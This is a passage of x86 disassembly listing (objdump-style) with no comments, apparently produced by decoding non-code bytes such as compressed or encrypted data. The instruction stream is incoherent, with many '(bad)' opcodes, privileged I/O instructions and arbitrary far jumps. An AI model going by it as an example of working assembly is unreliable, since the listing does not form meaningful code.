  41ab99:	mov    ebx,0x8064c24a
  41ab9e:	aaa    
  41ab9f:	adc    dh,BYTE PTR [esi+0x3d6cc695]
  41aba5:	(bad)  
  41aba6:	outs   dx,DWORD PTR ds:[esi]
  41aba7:	mov    cl,0xe8
  41aba9:	push   ss
  41abaa:	mov    ecx,0xdad35de7
  41abaf:	mov    ecx,0xd6239022
  41abb4:	(bad)  
  41abb5:	in     al,dx
  41abb6:	push   0xffffffad
  41abb8:	inc    ebp
  41abb9:	dec    ebp
  41abba:	inc    edx
  41abbb:	inc    edi
  41abbc:	xchg   DWORD PTR ds:0xd638c955,eax
  41abc2:	ds test al,0x94
  41abc5:	and    ebp,eax
  41abc7:	add    DWORD PTR [eax+0x5d],0xec7aa0be
  41abce:	fwait
  41abcf:	push   0x29
  41abd1:	push   ds
  41abd2:	add    cl,BYTE PTR [edi+0x62b07ea5]
  41abd8:	aas    
  41abd9:	out    dx,al
  41abda:	arpl   WORD PTR [ecx+0x3d],bx
  41abdd:	mov    edx,0x6ccd574
  41abe2:	push   cs
  41abe3:	sbb    ch,al
  41abe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abe6:	std    
  41abe7:	(bad)  
  41abe8:	jp     0x41ab7c
  41abea:	test   dl,dl
  41abec:	jb     0x41ac23
  41abee:	sub    BYTE PTR [ecx+0x6170ba45],0xd3
  41abf5:	xchg   esp,eax
  41abf6:	xchg   edi,eax
  41abf7:	jle    0x41abbe
  41abf9:	sub    DWORD PTR [esi],edx
  41abfb:	icebp  
  41abfc:	jmp    0x218b:0xf4ed29ab
  41ac03:	sbb    DWORD PTR [ecx+0x612f6f04],eax
  41ac09:	dec    eax
  41ac0a:	push   edx
  41ac0b:	cwde   
  41ac0c:	inc    ebp
  41ac0d:	mov    bh,0x80
  41ac0f:	in     eax,dx
  41ac10:	or     esi,eax
  41ac12:	(bad)  
  41ac13:	and    al,0x7e
  41ac15:	in     eax,0x26
  41ac17:	xor    ecx,ebp
  41ac19:	and    BYTE PTR [ebx+0x671a02fa],cl
  41ac1f:	jp     0x41abaf
  41ac21:	(bad)  
  41ac22:	jge    0x41ac49
  41ac24:	adc    esp,DWORD PTR [esi+0x178d5d65]
  41ac2a:	(bad)  
  41ac2b:	jmp    FWORD PTR [ebx-0x1f]
  41ac2e:	inc    ecx
  41ac2f:	push   es
  41ac30:	and    eax,DWORD PTR [ecx]
  41ac32:	jns    0x41abde
  41ac34:	in     eax,dx
  41ac35:	cmp    eax,0x6aa12cd9
  41ac3a:	stos   BYTE PTR es:[edi],al
  41ac3b:	xchg   BYTE PTR [esi-0x4e],cl
  41ac3e:	cwde   
  41ac3f:	rcl    ch,1
  41ac41:	push   ebp
  41ac42:	stos   DWORD PTR es:[edi],eax
  41ac43:	stos   BYTE PTR es:[edi],al
  41ac44:	mov    ebx,0xbac0c479
  41ac49:	addr16 int 0xc5
  41ac4c:	cmp    ebp,ebp
  41ac4e:	mov    bl,0xc1
  41ac50:	setg   BYTE PTR ds:0xa807ae7e
  41ac57:	stos   DWORD PTR es:[edi],eax
  41ac58:	int3   
  41ac59:	aas    
  41ac5a:	arpl   WORD PTR [edx+eiz*4-0x1a],si
  41ac5e:	rcl    BYTE PTR [edx],0x61
  41ac61:	cmp    cl,BYTE PTR [ebp+0x3f]
  41ac64:	mov    al,ds:0x9b74d82a
  41ac69:	and    al,BYTE PTR [eax+0x1c]
  41ac6c:	bound  ecx,QWORD PTR [ecx]
  41ac6e:	scas   eax,DWORD PTR es:[edi]
  41ac6f:	xchg   ebx,eax
  41ac70:	jbe    0x41acea
  41ac72:	out    0x73,al
  41ac74:	call   0x5ff:0x93dd5422
  41ac7b:	mov    al,ds:0x8d743430
  41ac80:	outs   dx,DWORD PTR ds:[esi]
  41ac81:	dec    esi
  41ac82:	mov    esi,0x9f5e2d76
  41ac87:	cmp    BYTE PTR [ebx-0x46],bh
  41ac8a:	pop    ebp
  41ac8b:	and    eax,DWORD PTR [ebp-0xe]
  41ac8e:	and    bl,ch
  41ac90:	sub    DWORD PTR [esp+eiz*2],edx
  41ac93:	jmp    0xad20:0xb326801f
  41ac9a:	jns    0x41acbc
  41ac9c:	and    esi,DWORD PTR [eax-0x9e58631]
  41aca2:	aad    0xee
  41aca4:	push   edx
  41aca5:	scas   al,BYTE PTR es:[edi]
  41aca6:	mov    ebx,0x45ba3826
  41acab:	jb     0x41ad13
  41acad:	cli    
  41acae:	xchg   esi,eax
  41acaf:	mov    ebx,0x708c0436
  41acb4:	mul    DWORD PTR [ebp-0x1c]
  41acb7:	xchg   edx,eax
  41acb8:	(bad)  
  41acb9:	mov    al,ds:0xb8607654
  41acbe:	xor    DWORD PTR [ecx+0x7a2644cb],0xc
  41acc5:	imul   edx,DWORD PTR [esi],0x5e891369
  41accb:	or     al,0xaf
  41accd:	popf   
  41acce:	fadd   QWORD PTR [edx+0x1a]
  41acd1:	loope  0x41ad19
  41acd3:	jo     0x41ac87
  41acd5:	jb     0x41ad22
  41acd7:	mov    edx,0xaf401cec
  41acdc:	loop   0x41ad4b
  41acde:	sbb    BYTE PTR [eax-0x6c],dh
  41ace1:	inc    edx
  41ace2:	xchg   BYTE PTR [ebx-0x63451d9c],dl
  41ace8:	adc    ebx,DWORD PTR [ebp-0xe40b95c]
  41acee:	push   cs
  41acef:	(bad)  
  41acf0:	fadd   st(2),st
  41acf2:	(bad)  
  41acf3:	cmc    
  41acf4:	mov    ah,BYTE PTR [esi+0x6a]
  41acf7:	add    eax,0xd36ad1cc
  41acfc:	gs sub eax,ebp
  41acff:	cdq    
  41ad00:	shr    cl,0xf9
  41ad03:	cwde   
  41ad04:	test   DWORD PTR ds:0xa3d325ba,0xf7e0673b
  41ad0e:	mov    ecx,0x7109e34f
  41ad13:	push   ebx
  41ad14:	adc    eax,edx
  41ad16:	dec    eax
  41ad17:	lds    esi,FWORD PTR [edi+0x7d7dddb9]
  41ad1d:	xchg   DWORD PTR [edx],esi
  41ad1f:	or     DWORD PTR [edx+0x3202572f],esp
  41ad25:	fisttp QWORD PTR [esi+0x2dc041bb]
  41ad2b:	cmp    al,0x88
  41ad2d:	rep ins BYTE PTR es:[edi],dx
  41ad2f:	test   ch,ch
  41ad31:	mov    ch,0x66
  41ad33:	mov    cl,0x41
  41ad35:	mov    dh,0x97
  41ad37:	push   edx
  41ad38:	pop    ss
  41ad39:	cwde   
  41ad3a:	push   edi
  41ad3b:	loopne 0x41ad61
  41ad3d:	sub    BYTE PTR [edi+0x2d1c0f48],ch
  41ad43:	push   0x2f
  41ad45:	mov    BYTE PTR [ebx+0x8],cl
  41ad48:	xchg   esi,eax
  41ad49:	outs   dx,DWORD PTR ds:[esi]
  41ad4a:	(bad)  
  41ad4c:	(bad)  
  41ad4d:	fidivr DWORD PTR [edi+0x2b1cef6f]
  41ad53:	mov    WORD PTR [edx],ss
  41ad55:	fld    QWORD PTR [eax-0x73]
  41ad58:	mov    ecx,0x90ce7c80
  41ad5d:	mov    dl,0x8f
  41ad5f:	fdiv   DWORD PTR [ecx+0x2989a206]
  41ad65:	sbb    BYTE PTR [ecx],bh
  41ad67:	daa    
  41ad68:	jl     0x41ad74
  41ad6a:	nop
  41ad6b:	mov    ch,0x5c
  41ad6d:	push   ds
  41ad6e:	jge    0x41ada4
  41ad70:	pop    edi
  41ad71:	cli    
  41ad72:	in     eax,0x71
  41ad74:	(bad)  
  41ad75:	rcr    BYTE PTR [edi+0x24],cl
  41ad78:	inc    ebp
  41ad79:	les    esi,FWORD PTR [eax]
  41ad7b:	mov    al,ds:0x54d574ec
  41ad80:	pushf  
  41ad81:	sahf   
  41ad82:	add    eax,0x3f21c3b7
  41ad87:	mov    cl,BYTE PTR [esi-0x7f64a2f0]
  41ad8d:	mov    ebx,0x7aa66d92
  41ad92:	outs   dx,DWORD PTR ds:[esi]
  41ad93:	(bad)  
  41ad94:	rsm    
  41ad96:	pop    esp
  41ad97:	ror    BYTE PTR [eax],0xfe
  41ad9a:	dec    edx
  41ad9b:	mov    cs,WORD PTR [eax-0x61]
  41ad9e:	add    cl,dh
  41ada0:	inc    DWORD PTR [ebx-0x65]
  41ada3:	(bad)  
  41ada4:	add    ebp,edi
  41ada6:	cmp    dl,dh
  41ada8:	jae    0x41adc9
  41adaa:	arpl   WORD PTR [edi],ax
  41adac:	cmc    
  41adad:	or     BYTE PTR [ebp+0x44022918],al
  41adb3:	inc    ebx
  41adb4:	jg     0x41ae21
  41adb6:	push   esi
  41adb7:	fmulp  st(3),st
  41adb9:	mov    edx,0x9b401f02
  41adbe:	sub    BYTE PTR [ebp+0x32],0xf4
  41adc2:	cs int 0x32
  41adc5:	hlt    
  41adc6:	pusha  
  41adc7:	ins    BYTE PTR es:[edi],dx
  41adc8:	punpckhdq mm7,QWORD PTR [ebx+0x4f]
  41adcc:	div    BYTE PTR ds:0x330b1272
  41add2:	pushf  
  41add3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41add4:	and    DWORD PTR [esi+0x5bcd5e79],edx
  41adda:	lea    esp,[edi]
  41addc:	nop
  41addd:	lods   al,BYTE PTR ds:[esi]
  41adde:	pusha  
  41addf:	in     eax,dx
  41ade0:	shr    BYTE PTR [edx],0xb1
  41ade3:	fadd   QWORD PTR ds:[esi-0x6]
  41ade7:	inc    esi
  41ade8:	pop    ecx
  41ade9:	jb     0x41adcf
  41adeb:	cmc    
  41adec:	xchg   edi,eax
  41aded:	xchg   edx,eax
  41adee:	add    DWORD PTR ds:[eax],eax
  41adf1:	adc    eax,0x575e9af0
  41adf6:	inc    edx
  41adf7:	sti    
  41adf8:	xchg   edx,eax
  41adf9:	dec    esp
  41adfa:	mov    ebx,0xa6bc0123
  41adff:	add    eax,0x83cc5e12
  41ae04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae05:	lods   eax,DWORD PTR es:[esi]
  41ae07:	ret    
  41ae08:	xor    ebx,ebx
  41ae0a:	mov    BYTE PTR [eax+0x42],cl
  41ae0d:	and    ah,BYTE PTR [ecx+0x13]
  41ae10:	and    DWORD PTR [ecx+0x47],ecx
  41ae13:	push   eax
  41ae14:	sub    eax,eax
  41ae16:	jmp    0x41ae58
  41ae18:	pop    ss
  41ae19:	fistp  WORD PTR [ecx]
  41ae1b:	stos   DWORD PTR es:[edi],eax
  41ae1c:	das    
  41ae1d:	and    esp,esp
  41ae1f:	repz push esp
  41ae21:	in     al,0x6e
  41ae23:	xor    esp,DWORD PTR ds:0xb0be646e
  41ae29:	and    dh,BYTE PTR [edi-0x6f207d0f]
  41ae2f:	fsubr  st(1),st
  41ae31:	xchg   edi,eax
  41ae32:	fsub   QWORD PTR [ecx+0x25]
  41ae35:	aaa    
  41ae36:	cmp    dh,BYTE PTR [ecx]
  41ae38:	mov    al,BYTE PTR [ecx-0x7a]
  41ae3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae3c:	or     edi,edi
  41ae3e:	adc    bl,BYTE PTR [ebp-0x3f]
  41ae41:	shl    BYTE PTR [ecx+edi*1+0x2d],0x9
  41ae46:	sub    eax,0x16006c13
  41ae4b:	loop   0x41adeb
  41ae4d:	clc    
  41ae4e:	fs cdq 
  41ae50:	lea    bp,ds:[edi]
  41ae54:	pushf  
  41ae55:	js     0x41add7
  41ae57:	je     0x41ae44
  41ae59:	leave  
  41ae5a:	push   ss
  41ae5b:	jp     0x41aec8
  41ae5d:	push   edi
  41ae5e:	(bad)  [ecx+ebp*2+0x6a]
  41ae62:	inc    edx
  41ae63:	pop    eax
  41ae64:	cmp    BYTE PTR [ebx-0x31c3f45f],bl
  41ae6a:	aad    0x83
  41ae6c:	clc    
  41ae6d:	mov    ebp,0xd0022c10
  41ae72:	test   al,0x5e
  41ae74:	sar    dl,0xff
  41ae77:	ss mov ebp,0xe5d25a58
  41ae7d:	push   edx
  41ae7e:	test   DWORD PTR [ebp+0x4150e8f0],edi
  41ae84:	aaa    
  41ae85:	mov    eax,0xf6be0a82
  41ae8a:	dec    esp
  41ae8b:	dec    esi
  41ae8c:	hlt    
  41ae8d:	dec    eax
  41ae8e:	enter  0x6063,0x53
  41ae92:	dec    ebp
  41ae93:	pusha  
  41ae94:	test   ah,bh
  41ae96:	or     al,0x6b
  41ae98:	xchg   edx,eax
  41ae99:	(bad)  
  41ae9a:	fst    st(7)
  41ae9c:	retf   
  41ae9d:	(bad)  
  41ae9e:	xchg   edx,eax
  41ae9f:	dec    ebx
  41aea0:	(bad)  
  41aea1:	fiadd  DWORD PTR [ebx-0x362bf5a6]
  41aea7:	aaa    
  41aea8:	fstp   TBYTE PTR [edx]
  41aeaa:	pop    edi
  41aeab:	test   BYTE PTR [esi],cl
  41aead:	ds icebp 
  41aeaf:	fistp  WORD PTR [eax]
  41aeb1:	inc    esp
  41aeb2:	dec    esp
  41aeb3:	sub    DWORD PTR [esi+esi*8],edi
  41aeb6:	push   edi
  41aeb7:	sbb    al,0x89
  41aeb9:	pop    ecx
  41aeba:	scas   eax,DWORD PTR es:[edi]
  41aebb:	and    BYTE PTR [ebx],bl
  41aebd:	mov    ebx,0xc0322fc0
  41aec2:	mov    bl,0xbc
  41aec4:	iret   
  41aec5:	pop    es
  41aec6:	shr    BYTE PTR [edi-0x60d15aaa],1
  41aecc:	add    dh,al
  41aece:	mov    ds:0xe2e3616e,al
  41aed3:	(bad)  
  41aed4:	retf   
  41aed5:	xchg   edi,eax
  41aed6:	mov    al,ds:0x1df71f0d
  41aedb:	add    ebp,esi
  41aedd:	lea    eax,[eax-0x3]
  41aee0:	mov    dh,0x41
  41aee2:	cs and esp,esp
  41aee5:	fstp   TBYTE PTR [esi+ecx*8+0x25]
  41aee9:	push   cs
  41aeea:	arpl   sp,cx
  41aeec:	cld    
  41aeed:	mov    dh,BYTE PTR [ecx-0x17ecc608]
  41aef3:	dec    ebp
  41aef4:	and    edi,DWORD PTR [edx-0x6f]
  41aef7:	int    0x49
  41aef9:	test   eax,ebx
  41aefb:	sub    DWORD PTR [eax],0x2b6b60ce
  41af01:	test   al,0xc8
  41af03:	sbb    al,0x60
  41af05:	inc    eax
  41af06:	add    cl,ah
  41af08:	or     dl,BYTE PTR [esi]
  41af0a:	stos   BYTE PTR es:[edi],al
  41af0b:	sub    bl,0x3a
  41af0e:	or     BYTE PTR [ecx+0x60],bl
  41af11:	ror    BYTE PTR [edi+ebp*1-0x2df84165],0xfc
  41af19:	xchg   ah,dl
  41af1b:	fwait
  41af1c:	mov    edx,0xf74d1827
  41af21:	ret    0x2802
  41af24:	ds (bad) 
  41af26:	loopne 0x41af7e
  41af28:	push   ss
  41af29:	les    ecx,FWORD PTR [si-0x31]
  41af2d:	mov    dl,0x46
  41af2f:	stc    
  41af30:	adc    DWORD PTR [ebp-0xe],esi
  41af33:	stc    
  41af34:	je     0x41af8a
  41af36:	in     eax,dx
  41af37:	or     al,0x24
  41af39:	pusha  
  41af3a:	jmp    0x41aeda
  41af3c:	aaa    
  41af3d:	and    DWORD PTR [ebx+0x5e],edx
  41af40:	mov    eax,esp
  41af42:	mov    bl,0x87
  41af44:	icebp  
  41af45:	ss xchg ecx,eax
  41af47:	outs   dx,DWORD PTR ds:[esi]
  41af48:	jg     0x41afc0
  41af4a:	int3   
  41af4b:	nop
  41af4c:	jns    0x41af5d
  41af4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af4f:	mov    eax,0xda35c0f0
  41af54:	std    
  41af55:	xchg   ebp,eax
  41af56:	push   edx
  41af57:	and    eax,0x158e2084
  41af5c:	push   eax
  41af5d:	cmp    ebp,DWORD PTR [ebx-0x68cc513d]
  41af63:	aam    0x1b
  41af65:	(bad)  
  41af66:	and    ah,BYTE PTR [ecx+0x2c867c2a]
  41af6c:	xlat   BYTE PTR ds:[ebx]
  41af6d:	mov    ebp,0xba5c703d
  41af72:	or     eax,0x7ef0010
  41af77:	gs mov bl,al
  41af7a:	inc    edx
  41af7b:	lds    esp,FWORD PTR [esi+0x1b218fbc]
  41af81:	xchg   ecx,eax
  41af82:	rcl    DWORD PTR ds:0xe31a906d,0x54
  41af89:	add    bl,BYTE PTR [esi]
  41af8b:	pushf  
  41af8c:	pop    ecx
  41af8d:	outs   dx,DWORD PTR ds:[esi]
  41af8e:	mov    ah,0x34
  41af90:	mov    edi,DWORD PTR [eax+edi*8-0xa]
  41af94:	in     al,0x37
  41af96:	jecxz  0x41afe7
  41af98:	(bad)  
  41af99:	(bad)  
  41af9b:	fs push edi
  41af9d:	xchg   BYTE PTR [edx],dh
  41af9f:	push   DWORD PTR [eax-0x4e470062]
  41afa5:	lock inc esp
  41afa7:	out    0x65,al
  41afa9:	jl     0x41af40
  41afab:	add    eax,0xaad233bb
  41afb0:	fist   WORD PTR ds:0x7fbab236
  41afb6:	push   edx
  41afb7:	dec    ebx
  41afb8:	sub    ebp,esi
  41afba:	hlt    
  41afbb:	adc    esi,DWORD PTR [esi]
  41afbd:	or     dh,BYTE PTR [edx]
  41afbf:	popf   
  41afc0:	push   cs
  41afc1:	in     al,0xb7
  41afc3:	dec    ecx
  41afc4:	fiadd  WORD PTR [ebx]
  41afc6:	int    0xa8
  41afc8:	out    0xa6,al
  41afca:	pushf  
  41afcb:	lea    ebp,[ebx-0x2b]
  41afce:	aad    0x2f
  41afd0:	inc    edi
  41afd1:	(bad)  [edx+0x57]
  41afd4:	ret    0xf5c8
  41afd7:	mov    ds,WORD PTR [esi-0x7108d2ef]
  41afdd:	add    ebp,ebx
  41afdf:	sbb    eax,0x10890ec3
  41afe4:	dec    eax
  41afe5:	iret   
  41afe6:	retf   0xffea
  41afe9:	lock dec edx
  41afeb:	push   es
  41afec:	aam    0x46
  41afee:	and    cl,BYTE PTR [edi-0x48]
  41aff1:	hlt    
  41aff2:	cdq    
  41aff3:	pop    eax
  41aff4:	sub    DWORD PTR [edi+0x42fd465f],edi
  41affa:	or     BYTE PTR [ebp+0x56],bh
  41affd:	dec    esp
  41affe:	add    ecx,DWORD PTR [ebx+0x4cfb963d]
  41b004:	cmp    esp,DWORD PTR [edx]
  41b006:	arpl   WORD PTR [ebx-0x69],si
  41b009:	shl    BYTE PTR [ecx+0x656a60e9],1
  41b00f:	jle    0x990cf19c
  41b015:	bound  esi,QWORD PTR [ebx+0xc86b1c7]
  41b01b:	xchg   ecx,eax
  41b01c:	push   ds
  41b01d:	ret    0xdcb6
  41b020:	in     eax,0x4d
  41b022:	std    
  41b023:	jb     0x41b062
  41b025:	or     al,0x82
  41b027:	jge    0x41b040
  41b029:	mov    ebp,0xac72acca
  41b02e:	in     al,dx
  41b02f:	int3   
  41b030:	outs   dx,DWORD PTR ds:[esi]
  41b031:	mov    edx,0x206f23d1
  41b036:	cmc    
  41b037:	mov    eax,0x96958ecb
  41b03c:	(bad)  
  41b03d:	pop    esp
  41b03e:	in     al,0x76
  41b040:	and    al,0xa7
  41b042:	sub    ah,BYTE PTR [esi-0x57]
  41b045:	in     al,dx
  41b046:	xchg   esp,eax
  41b047:	test   DWORD PTR [edi],eax
  41b049:	sub    DWORD PTR [ecx+0x5d0ae297],0x491d276b
  41b053:	jmp    0x1a043125
  41b058:	sbb    eax,esi
  41b05a:	dec    edi
  41b05b:	int    0x23
  41b05d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b05e:	or     al,0x6
  41b060:	sbb    dl,BYTE PTR [edi+0x43]
  41b063:	ror    DWORD PTR [edi-0x4f14787d],cl
  41b069:	mov    dh,BYTE PTR [ebx+0x5e4ccb67]
  41b06f:	xor    al,0x82
  41b071:	mov    eax,0xfbd57416
  41b076:	mov    bh,0x81
  41b078:	pop    es
  41b079:	xor    ecx,DWORD PTR ss:[edi]
  41b07c:	xor    al,0xb7
  41b07e:	repz mov eax,0xde34fce6
  41b084:	shl    edx,cl
  41b086:	lea    ebx,[ecx-0x26]
  41b089:	aaa    
  41b08a:	sub    edi,DWORD PTR [edx+0x26]
  41b08d:	arpl   cx,ax
  41b08f:	cmp    cl,BYTE PTR ds:0x2a482be5
  41b095:	mov    bl,0xbc
  41b097:	in     eax,0x35
  41b099:	sbb    bl,BYTE PTR [edi]
  41b09b:	xor    eax,0xa8657e0c
  41b0a0:	mov    ah,0x61
  41b0a2:	jno    0x41b03a
  41b0a4:	shl    BYTE PTR [ebp+edx*8-0x4b1b1d33],1
  41b0ab:	mov    eax,DWORD PTR [eax]
  41b0ad:	sti    
  41b0ae:	pop    ss
  41b0af:	cld    
  41b0b0:	and    BYTE PTR [edi-0x458acde8],al
  41b0b6:	add    ebx,DWORD PTR [ebx-0x1c]
  41b0b9:	data16 fs cs mov bh,0x81
  41b0be:	mul    esp
  41b0c0:	pusha  
  41b0c1:	ins    BYTE PTR es:[edi],dx
  41b0c2:	lock enter 0x4335,0x41
  41b0c7:	ficomp DWORD PTR [ecx-0x71]
  41b0ca:	inc    ebx
  41b0cb:	dec    di
  41b0cd:	or     cl,BYTE PTR [edx]
  41b0cf:	xor    edx,esp
  41b0d1:	sbb    DWORD PTR [esi],eax
  41b0d3:	int3   
  41b0d4:	fidiv  WORD PTR [edx]
  41b0d6:	ret    0x4b4d
  41b0d9:	fldcw  WORD PTR [edx]
  41b0db:	sub    al,0x80
  41b0dd:	imul   edi,esp,0xffffff83
  41b0e0:	pop    esi
  41b0e1:	popf   
  41b0e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0e3:	xor    BYTE PTR [edx+0x181588e7],0xc8
  41b0ea:	clc    
  41b0eb:	popa   
  41b0ec:	xchg   ebp,eax
  41b0ee:	dec    ebp
  41b0ef:	push   es
  41b0f0:	not    BYTE PTR [eax+0x32]
  41b0f3:	cmp    edi,DWORD PTR [esi]
  41b0f5:	stos   BYTE PTR es:[edi],al
  41b0f6:	fmul   DWORD PTR es:[edi+0x6c6f3869]
  41b0fd:	loop   0x41b179
  41b0ff:	pop    eax
  41b100:	fimul  WORD PTR [eax]
  41b102:	mov    edx,0x766a9e35
  41b107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b108:	sbb    eax,0xa8c00661
  41b10d:	mov    BYTE PTR [eax],ah
  41b10f:	sub    eax,0x6bf034bc
  41b114:	dec    ecx
  41b115:	and    edi,DWORD PTR [ebx-0x7445fa9]
  41b11b:	adc    dh,BYTE PTR [esi-0x74b771e8]
  41b121:	push   edx
  41b122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b123:	adc    eax,0x66055604
  41b128:	lods   al,BYTE PTR ds:[esi]
  41b129:	xchg   edi,eax
  41b12a:	push   edi
  41b12b:	icebp  
  41b12c:	aas    
  41b12d:	jmp    0xe509:0x8a55e5f9
  41b134:	or     eax,0x7597407d
  41b139:	xor    eax,DWORD PTR [esi-0x4e]
  41b13c:	mov    esi,0xa951cf89
  41b141:	or     eax,0x805b242d
  41b146:	mov    edx,0xaefbe24e
  41b14b:	sub    DWORD PTR [ecx],ebx
  41b14d:	fldcw  WORD PTR [esi+ecx*2+0x50]
  41b151:	pop    edx
  41b152:	inc    eax
  41b153:	adc    dl,BYTE PTR [edi]
  41b155:	ja     0x41b1a7
  41b157:	fcmovne st,st(3)
  41b159:	lods   eax,DWORD PTR ds:[esi]
  41b15a:	sahf   
  41b15b:	xchg   esp,eax
  41b15c:	cmp    esi,DWORD PTR [edx]
  41b15e:	out    0xf0,eax
  41b160:	in     al,dx
  41b161:	popf   
  41b162:	shl    DWORD PTR [esi+0xa],0x3
  41b166:	cmp    eax,0x5b87fdfc
  41b16b:	daa    
  41b16c:	adc    al,0x94
  41b16e:	sub    ah,BYTE PTR [ecx*1-0x24f7306b]
  41b175:	int    0xaa
  41b177:	mov    ecx,0x23ef2163
  41b17c:	lock inc ebx
  41b17e:	(bad)  
  41b17f:	(bad)  
  41b180:	stos   DWORD PTR es:[edi],eax
  41b181:	pop    ebp
  41b182:	push   esp
  41b183:	sbb    al,BYTE PTR [ecx]
  41b185:	leave  
  41b186:	jo     0x41b174
  41b188:	sbb    eax,0x7f975a8f
  41b18d:	adc    eax,0x14464082
  41b192:	shl    DWORD PTR [ecx+0x26],1
  41b195:	fst    QWORD PTR [edi-0x7f51ed56]
  41b19b:	and    edx,0xffffffb5
  41b19e:	inc    ebp
  41b19f:	mov    ch,0x27
  41b1a1:	aam    0x59
  41b1a3:	not    dl
  41b1a5:	daa    
  41b1a6:	icebp  
  41b1a7:	xor    DWORD PTR [edx],esp
  41b1a9:	pop    ds
  41b1aa:	mov    eax,ds:0x725a49ec
  41b1af:	push   eax
  41b1b0:	popf   
  41b1b1:	pusha  
  41b1b2:	repnz inc esp
  41b1b4:	scas   eax,DWORD PTR es:[edi]
  41b1b5:	adc    al,0xb4
  41b1b7:	neg    ebx
  41b1b9:	pop    ebp
  41b1ba:	enter  0x3255,0x51
  41b1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1bf:	jb     0x41b1f5
  41b1c1:	repz in eax,0xa0
  41b1c4:	xor    al,0x74
  41b1c6:	jne    0x41b1c5
  41b1c8:	mov    ch,0xdb
  41b1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1cb:	mov    esp,0x15a78fe
  41b1d0:	dec    eax
  41b1d1:	add    BYTE PTR [edx],cl
  41b1d3:	mov    esp,0xf38bd83e
  41b1d8:	test   DWORD PTR [ecx-0x3b],ebx
  41b1db:	gs jb  0x41b190
  41b1de:	mov    bl,0x41
  41b1e0:	inc    edx
  41b1e1:	mov    DWORD PTR [ebx+0x7b],esp
  41b1e4:	(bad)  
  41b1e5:	mov    ch,0x71
  41b1e7:	and    DWORD PTR [eax],ebx
  41b1e9:	adc    eax,0x4d89e23a
  41b1ee:	sbb    DWORD PTR [edx],0xf50a998
  41b1f4:	(bad)  
  41b1f5:	jmp    DWORD PTR [edi+eiz*2-0x6c80275]
  41b1fc:	push   es
  41b1fd:	fs fwait
  41b1ff:	shr    DWORD PTR [esi+0x28],0xe8
  41b203:	sub    eax,0x55a63b57
  41b208:	push   0xffffffe6
  41b20a:	mov    BYTE PTR [ecx],bl
  41b20c:	xchg   DWORD PTR [edi],ecx
  41b20e:	out    dx,al
  41b20f:	aas    
  41b210:	mov    ecx,0xb2b4ad68
  41b215:	add    eax,eax
  41b217:	adc    eax,0x5dcb0889
  41b21c:	call   0x1013:0x76387bee
  41b223:	mov    ch,0x95
  41b225:	mov    eax,ds:0x3ceac49c
  41b22a:	mov    esi,0x4ed666df
  41b22f:	pop    ebx
  41b230:	sub    eax,0x1d64d217
  41b235:	mov    ds:0x5edc3c74,eax
  41b23a:	aas    
  41b23b:	adc    esi,DWORD PTR [edx+ebx*2-0x36]
  41b23f:	push   ebx
  41b240:	lahf   
  41b241:	push   ebp
  41b242:	icebp  
  41b243:	inc    esp
  41b244:	inc    eax
  41b245:	pushf  
  41b246:	or     BYTE PTR [edx+0xa049359],0xf9
  41b24d:	or     DWORD PTR [eax-0x4b],ebx
  41b250:	stos   DWORD PTR es:[edi],eax
  41b251:	enter  0x6426,0x98
  41b255:	popf   
  41b256:	rcr    edi,1
  41b258:	fdiv   DWORD PTR [ebx-0x6f]
  41b25b:	sti    
  41b25c:	jbe    0x41b1ff
  41b25e:	scas   al,BYTE PTR es:[edi]
  41b25f:	sub    eax,0xe3e4ab84
  41b264:	repnz mov eax,0x8db26a04
  41b26a:	sbb    bh,BYTE PTR [edx+0x21]
  41b26d:	cmp    DWORD PTR [edx-0x21],0x23dc1466
  41b274:	mov    esp,0x82593171
  41b279:	pop    ebp
  41b27a:	fdivrp st(7),st
  41b27c:	retf   
  41b27d:	call   0xc62e:0xfe4e98ab
  41b284:	push   es
  41b285:	lds    edi,FWORD PTR [eax-0x78]
  41b288:	push   0x1a
  41b28a:	sub    eax,0x83b06e3b
  41b28f:	mov    edi,0x6251b3a0
  41b294:	popf   
  41b295:	jge    0x41b2de
  41b297:	mov    eax,eax
  41b299:	test   eax,0x4d245b
  41b29e:	imul   eax,ecx,0xe332d0c9
  41b2a4:	pop    ebx
  41b2a5:	dec    esp
  41b2a6:	pop    es
  41b2a7:	je     0x41b2bb
  41b2a9:	xchg   esp,eax
  41b2aa:	lods   eax,DWORD PTR ds:[esi]
  41b2ab:	mov    WORD PTR [edi],es
  41b2ad:	jl     0x41b323
  41b2af:	pop    esi
  41b2b0:	in     al,dx
  41b2b1:	gs mov bh,al
  41b2b4:	sub    BYTE PTR [edx],bl
  41b2b6:	rol    BYTE PTR [bx+si-0x7b],1
  41b2ba:	lahf   
  41b2bb:	dec    esi
  41b2bc:	and    eax,0xf2dc230
  41b2c1:	mov    ecx,0x9c93c132
  41b2c6:	pop    ds
  41b2c7:	out    dx,eax
  41b2c8:	push   cs
  41b2c9:	mov    DWORD PTR [ebp-0x14],0x3227e9ab
  41b2d0:	sub    ebp,eax
  41b2d2:	inc    ebp
  41b2d3:	jge    0x41b32d
  41b2d5:	jbe    0x41b304
  41b2d7:	xchg   ecx,eax
  41b2d8:	(bad)  
  41b2d9:	mov    bh,0x89
  41b2db:	cld    
  41b2dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2dd:	sti    
  41b2de:	cmp    eax,0xab87132c
  41b2e3:	mov    ebx,edx
  41b2e5:	push   edi
  41b2e6:	mov    ch,0x55
  41b2e8:	push   ds
  41b2e9:	out    0x47,eax
  41b2eb:	leave  
  41b2ec:	ret    
  41b2ed:	lods   eax,DWORD PTR ds:[esi]
  41b2ee:	shl    BYTE PTR [esi],0x45
  41b2f1:	sub    eax,0x13835b6f
  41b2f6:	mov    ds:0x4f2d5b24,eax
  41b2fb:	out    0xce,al
  41b2fd:	sbb    dl,BYTE PTR [edx+0x41]
  41b300:	out    dx,al
  41b301:	xchg   ebp,eax
